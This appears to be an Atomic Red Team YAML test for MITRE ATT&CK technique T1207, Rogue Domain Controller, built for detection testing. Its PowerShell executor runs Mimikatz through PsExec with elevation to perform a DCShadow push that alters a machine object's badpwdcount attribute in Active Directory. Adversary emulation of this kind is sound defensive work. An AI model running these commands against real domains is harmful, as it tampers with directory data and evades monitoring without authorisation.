attack_technique: T1207
display_name: Rogue Domain Controller
atomic_tests:
- name: DCShadow - Mimikatz
  auto_generated_guid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
  description: |
    Use Mimikatz DCShadow method to simulate behavior of a Domain Controller

    [DCShadow](https://www.dcshadow.com/)
    [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
  supported_platforms:
  - windows
  input_arguments:
    machine:
      description: Targeted machine
      type: string
      default: CLIENT1
    output_file:
      description: Output file
      type: path
      default: PathToAtomicTest\\bin\\Mimikatz\\x64\\mimikatz.log
    mimikatz_path:
      description: mimikatz windows executable
      type: Path
      default: PathToAtomicTest\\bin\\Mimikatz\\x64\\mimikatz.exe
    psexec_path:
      description: psexec windows executable
      type: Path
      default: PathToAtomicTest\\bin\\PsExec.exe
  executor:
    name: powershell
    elevation_required: false
    command: |
      $mimikatzParam ="`"log #{output_file}`" `"lsadump::dcshadow /object:#{machine}$ /attribute:badpwdcount /value=9999`" `"exit`""
      $mimikatzParam2 ="`"lsadump::dcshadow /push`" `"exit`""
      Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/k #{psexec_path} -i -s #{mimikatz_path} $mimikatzParam"
      Start-Sleep -Seconds 5
      Start-Process -FilePath '#{mimikatz_path}' -Verb Runas -ArgumentList "$mimikatzParam2"

